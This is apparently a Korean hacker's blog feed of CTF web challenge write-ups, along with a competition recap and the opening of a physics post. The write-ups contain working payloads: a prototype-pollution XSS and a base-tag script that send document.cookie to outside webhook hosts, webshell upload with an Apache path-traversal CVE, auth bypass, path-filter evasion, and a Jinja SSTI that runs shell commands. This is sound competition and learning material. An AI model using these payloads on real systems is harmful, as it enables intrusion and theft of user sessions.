          $result = @iconv($in_charset, $out_charset, $str);
  
          if ($result === false) {
              throw new Exception(&quot;iconv conversion failed: Detected an illegal character in input string&quot;);
          }
          return $result;
      }
  
      $dummy = str_repeat(&quot;A&quot;, 1098);
      try {
          $passcord = safe_iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
      } catch (Exception $e) {
          header(&quot;location:index.html&quot;);
          echo &quot;redirected&quot;;
          exit();
      } finally {
          $passcord = iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
          $passcord_hex = bin2hex($passcord);
          error_log(&quot;Passcord: &quot; . $passcord_hex);
          if (strlen($passcord_hex) &amp;gt;= 8) {
              $fourth_byte_hex = substr($passcord_hex, 6, 2);
              $fourth_byte_value = hexdec($fourth_byte_hex);
  
              if ($fourth_byte_value &amp;gt;= 0x48 &amp;amp;&amp;amp; $fourth_byte_value &amp;lt;= 0x4C) {
                  header(&quot;location:index.html&quot;);
                  echo &quot;redirected&quot;;
                  exit();
              } else {
                  error_log(&quot;OK&quot;);
              }
          } else {
              header(&quot;location:index.html&quot;);
              echo &quot;redirected&quot;;
              exit();
          }
          
      }
  
      $newoutput = str_replace(&quot;{{ passcord }}&quot;, $passcord, $output);
      $newoutput = str_replace(&quot;{{ dummy }}&quot;, $dummy, $newoutput);
      $newoutput = str_replace(&quot;{{ flag }}&quot;, $flag, $newoutput);
  
      echo $newoutput;
      $saved_time = $_SESSION[&apos;time&apos;];
      $comparison_time = &apos;2028-08-03 18:05:00&apos;;
      $saved_time_obj = new DateTime($saved_time);
      $comparison_time_obj = new DateTime($comparison_time);
  
      if ($saved_time_obj &amp;lt; $comparison_time_obj) {
          ob_clean();
          $newoutput = &quot;&quot;;
          header(&quot;location:index.html&quot;);
          echo &quot;redirected&quot;;
      }
      ob_flush();
      flush();
  }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;passcord&lt;/code&gt;가 맞으면 플래그를 준다.
중요한 부분만 뽑아서 passcord에 대해 분석해보자&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$passcord = mb_strcut($passcord, 0, 3, &apos;UTF-8&apos;);
$passcord = iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
$passcord_hex = bin2hex($passcord);

if (strlen($passcord_hex) &amp;gt;= 8) {
    $fourth_byte_hex = substr($passcord_hex, 6, 2);
    $fourth_byte_value = hexdec($fourth_byte_hex);

    if ($fourth_byte_value &amp;gt;= 0x48 &amp;amp;&amp;amp; $fourth_byte_value &amp;lt;= 0x4C) {
        header(&quot;location:index.html&quot;);
        echo &quot;redirected&quot;;
        exit();
    } else {
        error_log(&quot;OK&quot;);
    }
} else {} // 실패 로직 생략

&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;앞에서 3바이트 strcut&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ISO-2022-CN-EXT&lt;/code&gt; 변환&lt;/li&gt;
&lt;li&gt;4번째 바이트가 &lt;code&gt;0x48 ~ 0x4C&lt;/code&gt; 사이에 있으면 &lt;code&gt;exit();&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;import subprocess

for i in range(0x20, 0x3000):
    ch = chr(i)
    if len(ch.encode(&apos;utf-8&apos;)) &amp;gt; 3:
        continue
    p = subprocess.run(
        [&apos;iconv&apos;, &apos;-f&apos;, &apos;UTF-8&apos;, &apos;-t&apos;, &apos;ISO-2022-CN-EXT&apos;],
        input=ch.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )
    out = p.stdout
    if len(out) &amp;lt; 4:
        continue
    b4 = out[3]
    if 0x48 &amp;lt;= b4 &amp;lt;= 0x4C:
        continue
    print(f&quot;{repr(ch)} -&amp;gt; 4th byte: {b4:#04x}&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;익스플로잇은 간단하게 나온다. 빨리 풀려고 좀 분석 때리고 지피티보고 짜달라했다&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./f_excode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: cce2024{d82e4e7f1882be6a45b603ad2a552e513f680d2c25547aa3cdcd80f0edbabd4f}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;04-정보자원관리원&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;/readflag&lt;/code&gt;가 존재하기에 RCE 해야한다는걸 알 수 있다.
난 php rce 문제가 나오면 보통 웹셸하고 php 역직렬화를 먼저 의심해보는편이다.
역직렬화 포인트는 딱히 안보이고, 업로드 기능이 &lt;code&gt;/api/report_check.php&lt;/code&gt;에 존재하기에 웹셸 업로드라고 생각했다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    session_start();
    if(!isset($_SESSION[&apos;uid&apos;])) {
        header(&apos;Location: /login.php&apos;);
    }

    include &apos;../config/db.php&apos;;

    function generateRandomString($length = 10) {
        $characters = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;
        $charactersLength = strlen($characters);
        $randomString = &apos;&apos;;
    
        for ($i = 0; $i &amp;lt; $length; $i++) {
            $randomString .= $characters[random_int(0, $charactersLength - 1)];
        }
    
        return $randomString;
    }

    $name = $_POST[&apos;name&apos;];
    $content = $_POST[&apos;content&apos;];
    $author = $_SESSION[&apos;uid&apos;];

    if(!$name || !$content) {
        die(&quot;신고자 및 신고 대상자를 모두 입력해주세요.&quot;);
    }

    $maxFileSize = 3 * 1024 * 1024; // 5MB

    $evidence = $_FILES[&apos;evidence&apos;];
    
    $random_name = generateRandomString();
    if($evidence[&apos;size&apos;] &amp;gt; 0) {
        if($evidence[&apos;size&apos;] &amp;gt; $maxFileSize) {
            die(&quot;파일 크기는 3MB 이하여야 합니다.&quot;);
        }
        if($evidence[&apos;error&apos;] === 0) {
            $evidencePath = &apos;/app/report/&apos; . $name . &apos;_&apos; . $random_name.&apos;_&apos;.$evidence[&apos;name&apos;];
            move_uploaded_file($evidence[&apos;tmp_name&apos;], $evidencePath);
        }
    
        $ext = pathinfo($evidencePath, PATHINFO_EXTENSION);
        $stmt = $dbcon-&amp;gt;prepare(&quot;INSERT INTO report (name, content, evidence, author_id) VALUES (?, ?, ?, ?)&quot;);
        $stmt-&amp;gt;bind_param(&quot;ssss&quot;, $name, $content, $evidencePath, $author);
        $stmt-&amp;gt;execute();
    
        if($ext !== &apos;zip&apos;){
            die(&quot;zip 파일만 업로드 가능합니다.&quot;);
        }
    
        echo &quot;&amp;lt;script&amp;gt;alert(&apos;신고가 완료되었습니다. 신고번호 : &quot;.$random_name.&quot;&apos;);history.go(-1)&amp;lt;/script&amp;gt;&quot;;
    } else {
        $stmt = $dbcon-&amp;gt;prepare(&quot;INSERT INTO report (name, content, author_id) VALUES (?, ?, ?)&quot;);
        $stmt-&amp;gt;bind_param(&quot;sss&quot;, $name, $content, $author);
        $stmt-&amp;gt;execute();
        echo &quot;&amp;lt;script&amp;gt;alert(&apos;신고가 완료되었습니다. 신고번호 : &quot;.$random_name.&quot;&apos;);history.go(-1)&amp;lt;/script&amp;gt;&quot;;
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;코드를 잘 읽어보면 모든 파일을 업로드 하고 마지막에 zip 파일만 업로드 가능하다고 die를 하는 버그가 있다.&lt;/p&gt;
&lt;p&gt;따라서 php webshell을 넣을 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;그러나 &lt;code&gt;random_name&lt;/code&gt;을 붙이기에 바로 웹셸을 실행할 수 는 없다&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;000-default.conf에서 &lt;code&gt;RewriteRule&lt;/code&gt;이라는걸 쓰길래 구글링해봤고 &lt;code&gt;CVE-2024-38475&lt;/code&gt;가 존재한다는걸 알 수 있었다.
이 취약점은 &lt;code&gt;mod_rewrite&lt;/code&gt;가 사용되는 구버전의 apache HTTP server에서 &lt;code&gt;%3F&lt;/code&gt;를 붙이게 되면 파싱을 잘못해서 &lt;code&gt;LFI&lt;/code&gt;가 터지는 그런거라고 하는데
경로뒤에 &lt;code&gt;%3F&lt;/code&gt; 넣으면 다 익스 되길래 정확히는 안찾아봤다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://16.184.15.57:8090/user/admin/pw.json%3F&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;이렇게 해서 어드민 계정을 가져올 수 있다.&lt;/p&gt;
&lt;p&gt;이후에 &lt;code&gt;http://16.184.15.57:8090/admin/api/post_select.php&lt;/code&gt;에서 sqli로 디비털어서 웹셸명 찾고 &lt;code&gt;/readflag&lt;/code&gt; 실행하면 끝이다&lt;/p&gt;
&lt;p&gt;글을 쓰는 시점에 누군가 admin 기능을 먹통으로 만들어놔서 이 부분 풀이는 적지 않겠다&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;후기&lt;/h1&gt;
&lt;p&gt;이번에도 역시 sqli가 발목을 잡았다.
다른 취약점들도 시간이 걸리긴 했지만 꽤 쉽게 알아챘던거 같은데 SQL 인젝션은 지피티랑 씨름해서 겨우 페이로드 얻었다&lt;/p&gt;
&lt;p&gt;제발 이번에 1인분만 하길..&lt;/p&gt;
</content:encoded></item><item><title>2025 HackQuest [Simple Note] Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
못 푼 한 문제가 아래에서 설명할 &lt;code&gt;Simple Note&lt;/code&gt;보다 쉬운 문제였지만 헤메다 풀지 못했다.&lt;/p&gt;
&lt;h2&gt;Simple Note (Web)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;app.get(&apos;/track&apos;, (req, res) =&amp;gt; {
  const id = req.query.id
  const p = posts.get(id)
  if (p &amp;amp;&amp;amp; p.author !== req.session.user) p.views++
  res.end(p ? &apos;views:&apos; + p.views : &apos;&apos;)
})

app.get(&apos;/view&apos;, (req, res) =&amp;gt; {
  const id = req.query.id
  const p = posts.get(id)
  if (!p) return res.status(404).send(&apos;not found&apos;)
  res.send(`&amp;lt;!doctype html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;script src=&quot;./config.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&quot;https://cdn.jsdelivr.net/npm/qs@6.10.2/dist/qs.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;/head&amp;gt;&amp;lt;body id=&quot;main&quot;&amp;gt;
    &amp;lt;div id=&quot;content&quot;&amp;gt;${DOMPurify.sanitize(p.html)}&amp;lt;/div&amp;gt;
    &amp;lt;div id=&quot;out&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;/body&amp;gt;
    &amp;lt;script&amp;gt;
    let data = {}
    function merge(target, source) {
      for (const key in source) {
        const value = source[key];
        if (value &amp;amp;&amp;amp; typeof value === &apos;object&apos;) {
          if (!target[key]) {
            target[key] = {};
          }
          merge(target[key], value);
        } else {
          target[key] = value;
        }
      }
      return target;
    }

    const params = Qs.parse(location.search.slice(1), { 
        depth: window.options.depth ? window.options.depth : 5,
        allowPrototypes: window.options.allowPrototypes ? true : false,
        parameterLimit: window.options.parameterLimit ? window.options.parameterLimit: 5
     })
    merge(data, params)
    $.get(&apos;/track?id=&apos;, data)
    &amp;lt;/script&amp;gt;
    &amp;lt;/html&amp;gt;`)
})

app.get(&apos;/config.js&apos;, (req, res) =&amp;gt; {
  res.send(`
  window.options = {}
  window.options.depth = 20;
  window.options.allowPrototypes = false;
  window.options.parameterLimit = 20;  
  `)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;작성한 노트를 그대로 보여주는 서비스이다.
html 삽입은 가능하지만 &lt;code&gt;DOMPurify.sanitize()&lt;/code&gt; 되어 들어가기에 바로 XSS는 불가능하다.&lt;/p&gt;
&lt;p&gt;qs@6.10.2에 &lt;code&gt;CVE-2022-24999&lt;/code&gt; Prototype pollution 취약점이 존재하고, &lt;code&gt;merge()&lt;/code&gt; 함수에서도 pp가 일어난다.
그러나 &lt;code&gt;allowPrototypes&lt;/code&gt;가 false이기 때문에 바로 Prototype pollution 하는 것 또한 불가능하다.&lt;/p&gt;
&lt;p&gt;일단 처음으로 해야할 건 RPO다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script src=&quot;./config.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;상대 경로로 config.js를 로드하고 있기에 &lt;code&gt;/view/?id=id&lt;/code&gt; 처럼 뒤에 &lt;code&gt;/&lt;/code&gt;를 붙이면 config.js의 로드를 막을 수 있다.&lt;/p&gt;
&lt;p&gt;어차피 allowPrototypes는 계속 false이다. 여기서 RPO를 일으키는건 window.options가 initialize 되지 않게 하기 위해서다.&lt;/p&gt;
&lt;p&gt;window.options가 할당되어 있지 않기에 Dom Clobbering으로 options를 덮어 allowPrototypes를 true로 설정할 수 있다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;form name=&quot;options&quot;&amp;gt;
     &amp;lt;input name=&quot;allowPrototypes&quot; value=&quot;true&quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;이렇게 Dom Clobbering 페이로드를 작성한다&lt;/p&gt;
&lt;p&gt;이제 &lt;code&gt;Prototype pollution&lt;/code&gt;이 가능해졌다. XSS는 여전히 불가능해보일 수 있지만
여기서 찾은 방법이 &lt;code&gt;Jquery XSS by prototype pollution&lt;/code&gt; 이다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$.get(&apos;/track?id=&apos;, data)&lt;/code&gt;를 마지막에 사용하기에 XSS를 트리거 할 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md&quot;&gt;레퍼런스&lt;/a&gt;를 약간 변형해서 xss를 성공시켰다&lt;/p&gt;
&lt;p&gt;최종 페이로드는 이렇다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&amp;amp;[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href=&apos;https://webhook/test?q=&apos;+%2Bdocument.cookie;//&amp;amp;[constructor][prototype][dataType]=script&amp;amp;[constructor][prototype][crossDomain]=
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}&lt;/code&gt;&lt;/p&gt;
</content:encoded></item><item><title>AJOU COSS CTF 2025 Final 후기</title><link>https://itznullbyte.github.io/posts/cossctf-final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf-final/</guid><description> </description><pubDate>Sun, 20 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;대회장 입장&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./start.jpg&quot; alt=&quot;&quot; /&gt;
아주대 COSS CTF 본선 갔다왔다. 생각나는대로 적어보겠다.&lt;/p&gt;
&lt;p&gt;일단 9시에 30분 일찍 대회장 도착했다. 30분 동안 대기실에 있었는데 아는 사람이 없어서 구석에서 인스타 보고 있었다
팀원들 만나고 대회장 들어갔다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./teamtag.jpg&quot; alt=&quot;&quot; /&gt;
강의실에서 대회 진행했는데 진짜 강의실 일체형 나무 의자는 지옥이다. 대회 내내 허리아파 죽는줄 알았다&lt;/p&gt;
&lt;p&gt;이름표 받았는데 주위 둘러보니까 이름 한 번씩 들어본 사람들이 꽤 있었다 현실에서 보니 신기했다&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;대회 시작&lt;/h2&gt;
&lt;p&gt;일단 난 시작하자마자 웹을 잡았다.&lt;br /&gt;
어차피 crypto나 분야별 쉬운 문제는 누군가 풀어줄거기에 플래그 욕심 안내고 웹만 하루종일 풀고 가자는 생각으로 했다.&lt;br /&gt;
웹 문제는 블랙박스 3문제, 화이트 박스 1문제가 나왔다&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./first_prob.png&quot; alt=&quot;&quot; /&gt;
첫번째는 저런식으로 입력하면 파일 다운해주는 서비스였다&lt;/p&gt;
&lt;p&gt;웹 최다솔브 나온 문제였는데 오래 잡고있던건 진짜 사고다&lt;/p&gt;
&lt;p&gt;중간에 밥 나왔는데 맛있었다&lt;/p&gt;
&lt;p&gt;오프라인 CTF는 처음이라 좀 긴장해서 그런지 아무것도 못했던거 같다.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;결국 난 0솔로 마무리했다.
CTF하면서 0솔한건 처음 같은데 0솔한거 자체보단 당연히 풀법한 문제들을 못풀었다는게 더 참담했다.&lt;/p&gt;
&lt;p&gt;다음 CTF까지는 팀원들한테 민폐 안끼치도록 열심히 공부할 생각이다.
CCE 전까진 부족한 부분 기초 개념까진 메우고 드림핵 5~6레벨 위주로 풀어볼 생각이다&lt;/p&gt;
</content:encoded></item><item><title>AJOU COSS CTF Quals 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/cossctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf/</guid><description>3th</description><pubDate>Mon, 23 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./scoreboard.jpg&quot; alt=&quot;&quot; /&gt;
운 좋게도 예선 3등했다.&lt;/p&gt;
&lt;p&gt;아주대 CTF 열린다고 해서 세명컴고 팀원 두 분이랑 아는 웹 해커 한 분이랑 같이 예선 나갔다.&lt;br /&gt;
팀원들이 다 열심히 해주기도 했고, 같이 웹 푼 팀원이 나랑 합이 꽤 잘 맞아서 잘 풀었던거 같다.&lt;/p&gt;
&lt;p&gt;라이트업은 잘 모르는 분야까지 다 쓰긴 좀 그래서 웹만 써보겠다&lt;/p&gt;
&lt;h2&gt;Solve&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;[Web] My WebView&lt;/li&gt;
&lt;li&gt;[Web] Admin NAS&lt;/li&gt;
&lt;li&gt;[Web] XSS Tester&lt;/li&gt;
&lt;li&gt;[Web] Donation&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Write-Up&lt;/h2&gt;
&lt;h3&gt;My WebView&lt;/h3&gt;
&lt;p&gt;간단한 SSRF 문제이다&lt;/p&gt;
&lt;p&gt;일단 기본적으로 링크를 넣으면 서버에서 요청해서 그걸 보여주는 서비스이다.&lt;/p&gt;
&lt;p&gt;html에 ?list가 주석처리 되어 있고 접속해보면 서버 디렉토리 리스트를 준다.
hosts에선 서버의 내부 아이피를, reports에선 내부망 포트 범위와 /flag 디렉토리의 존재를 알려준다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const axios = require(&apos;axios&apos;);

(async () =&amp;gt; {
  for (let i = 1000; i &amp;lt;= 10000; i++) {
    const res = await axios.get(`http://3.36.10.125/?url=http://192.168.200.110:${i}/internal`);

    if(res.data !== &apos;&apos;) {
      console.log(`Find Port! ${i}`);
    }
  }
})();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;http://3.36.10.125/?url=http://192.168.200.110:5090/flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;이런식으로 브포 코드 짜서 포트 알아내고 플래그 읽어오면 된다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{b59855ea1f33a1a8ec0cc0216abcd058603b5e34b86ea4e2344f8a0811bfa1cdd683be3badbe440835a3f685615628d5099d1f35209858e1241b587be593}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Admin NAS&lt;/h3&gt;
&lt;p&gt;해외 CTF 어딘가에서 봤던 로직 그대로 나온 문제였는데 그걸 기억 못하고 많이 삽질했다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const users = {
  admin: {
    password: crypto.randomBytes(16).toString(&apos;hex&apos;), otp: &quot;disabled&quot;
  },
};

const FILES_DIR = path.join(__dirname, &quot;public&quot;);

const BLOCKED_KEYWORDS = [&quot;../&quot;, &quot;/proc&quot;, &quot;/bin&quot;, &quot;/etc&quot;, &quot;/flag.txt&quot;, &quot;/home&quot;, &quot;/root&quot;]

const isAdmin = (req, res, next) =&amp;gt; {
  if (req.session.isAdmin) {
    next();
  } else {
    res.status(403).json({ message: &quot;ADMIN만 접근 가능합니다.&quot; });
  }
}

app.get(&quot;/auth&quot;, (req, res) =&amp;gt; {
  const { username, authType, value } = req.query;

  if (!username || !authType || !value) return res.status(400).json({ message: &quot;Usage: ?username=&amp;amp;authType=&amp;amp;value=&quot; });
  if (authType == &quot;otp&quot; &amp;amp;&amp;amp; isNaN(value)) return res.status(400).json({ message: &quot;OTP는 숫자만 사용할 수 있습니다.&quot; });

  if (users[username][authType] == value) {
    req.session.isAdmin = true;
    res.status(200).json({ message: `환영합니다, ${username}님` })
  }
  else return res.status(401).json({ message: &quot;계정정보가 일치하지 않습니다.&quot; })
});

app.get(&quot;/download&quot;, isAdmin, (req, res) =&amp;gt; {
  const { filename } = req.query;

  if (!filename) return res.status(400).json({ message: &quot;Usage: ?filename=test.png&quot; });

  BLOCKED_KEYWORDS.forEach(keyword =&amp;gt; {
    if (filename.includes(keyword)) {
        return res.status(400).json({ message: &quot;파일 이름이 올바르지 않습니다.&quot; });
    }
  });
  const filePath = path.normalize(`${FILES_DIR}/${filename}`);
  try {
    return res.sendFile(filePath);
  } catch {
    return res.status(404).json({ message: &quot;파일을 찾을 수 없습니다.&quot; });
  }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;authType을 내 맘대로 넣을 수 있어서 굳이 OTP로 인증할 필요 없다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost:3000/auth?username=toString&amp;amp;authType=length&amp;amp;value=0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;이런식으로 요청 보내서 어드민 따주면 된다.&lt;/p&gt;
&lt;p&gt;이후 LFI는 쉬운데 &lt;code&gt;../&lt;/code&gt;랑 &lt;code&gt;flag&lt;/code&gt; 같은 문자열들을 다 필터링하기에&lt;br /&gt;
&lt;code&gt;?filename[]=../flag.txt&lt;/code&gt;과 같이 filename을 객체로 만들어서 우회하면 필터링에 걸리지 않는다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{0ba7873c0f9bdc1373cc7f330721ca96fcbef55e2f0912e44474505dca939bd5}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;XSS Tester&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

if (isset($_GET[&quot;source&quot;])) {
    show_source(__FILE__);
    die();
}

$payload = isset($_GET[&quot;p&quot;]) ? $_GET[&quot;p&quot;] : &quot;&quot;;

$nonce = md5(random_bytes(16));
header(&quot;Content-Security-Policy: default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos; *; script-src &apos;nonce-$nonce&apos;&quot;);
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;
    &amp;lt;title&amp;gt;XSS Blood&amp;lt;/title&amp;gt;
    &amp;lt;link href=&quot;./bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
    &amp;lt;style&amp;gt;
        body {
            background-color: #f8f9fa;
        }
        .form-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .form-header {
            margin-bottom: 20px;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div class=&quot;container mt-5&quot;&amp;gt;
        &amp;lt;div class=&quot;row justify-content-center&quot;&amp;gt;
            &amp;lt;div class=&quot;col-md-8 col-lg-6&quot;&amp;gt;
                &amp;lt;div class=&quot;form-container&quot;&amp;gt;
                    &amp;lt;textarea class=&quot;form-control&quot; disabled&amp;gt;Welcome, &amp;lt;?= $payload ?&amp;gt;&amp;lt;/textarea&amp;gt;
                &amp;lt;/div&amp;gt;

                &amp;lt;script src=&quot;./loader.js&quot; nonce=&quot;&amp;lt;?=$nonce?&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;그냥 스크립트 삽입으로는 xss 안터지지만&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://13.125.240.40:8888/xss.php?p=a&amp;lt;/textarea&amp;gt;&amp;lt;base href=&quot;//222.121.122.208&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;textarea 끝내고 base 사용해서 nonce retargeting 해 &lt;code&gt;/loader.js&lt;/code&gt;가 내 서버로 요청하게 한다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const express = require(&apos;express&apos;);

const app = express();

app.listen(80);

app.use((req, res, next) =&amp;gt; {
  res.send(`window.open(&apos;https://xjjcbot.request.dreamhack.games?q=&apos;+document.cookie)`);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;서버에서 스크립트 보내서 쿠키 탈취했다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{31837ae2b1fffc0d3f602eff406cebf936307e82904b0da5605c147ab465ee91}&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Donation&lt;/h3&gt;
&lt;p&gt;블랙박스 문제이다.&lt;br /&gt;
로그인 한 후 가진 돈을 기부하는 기능이 있고 기부할 때 기부 메시지를 적을 수 있다.&lt;/p&gt;
&lt;p&gt;여기서 방향성이 전혀 안보여서 애 좀 먹었다
삽질하다보니 중괄호 넣고 요청하면 오류메시지가 출력 되는걸 알 수 있었고 서버가 python으로 돌아가고 있다는걸 http 헤더에서 발견해 SSTI라는걸 유추했다.&lt;/p&gt;
&lt;p&gt;필터링이 좀 빡세게 걸려있어서 익스 못하고 있었는데 팀원분이 기가 막히게 익스해버리셨다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% for key in self.__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;cat flag&apos;).read() %}
{% if key == &apos;f&apos; %}
f
{% elif key == &apos;0&apos; %}0
{% elif key == &apos;1&apos; %}1
{% elif key == &apos;2&apos; %}2
{% elif key == &apos;3&apos; %}3
{% elif key == &apos;4&apos; %}4
{% elif key == &apos;5&apos; %}5
{% elif key == &apos;6&apos; %}6
{% elif key == &apos;7&apos; %}7
{% elif key == &apos;8&apos; %}8
{% elif key == &apos;9&apos; %}9
{% elif key == &apos;a&apos; %}a
{% elif key == &apos;b&apos; %}b
{% elif key == &apos;c&apos; %}c
{% elif key == &apos;d&apos; %}d
{% elif key == &apos;e&apos; %}e
{% elif key == &apos;f&apos; %}f
{% elif key == &apos;A&apos; %}A
{% elif key == &apos;B&apos; %}B
{% elif key == &apos;C&apos; %}C
{% elif key == &apos;D&apos; %}D
{% elif key == &apos;E&apos; %}E
{% elif key == &apos;F&apos; %}F
{% elif key == &apos;l&apos; %}l
{% elif key == &apos;g&apos; %}g

{% else %}
?
{% endif %}
{% endfor %}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;저렇게 다 따로 출력하는 이유는 플래그에 있는 중괄호 필터링 때문에 응답이 안와서 한 글자씩 중괄호만 빼고 출력해서 그렇다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{c59abb2a665a38345ee0d92687aeec35002721ccfd12a807b802a3436afe6183bcc618e1953771fd39ed3d3bbd696f947b3e90408547246a}&lt;/code&gt;&lt;/p&gt;
</content:encoded></item><item><title>Physics I Problem Solving</title><link>https://itznullbyte.github.io/posts/physics/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
&lt;p&gt;보안 문제 풀이 쓰는거 처럼 푼 물리문제 정리해놓으면 기억에 남을거 같아서 시작해본다.&lt;/p&gt;
&lt;h2&gt;Solve&lt;/h2&gt;
&lt;h3&gt;2019 학년도 9월 모평 6번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./2019_6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;거리는 다른데 A, B가 동시에 도착한다&lt;/p&gt;
&lt;ul&gt;
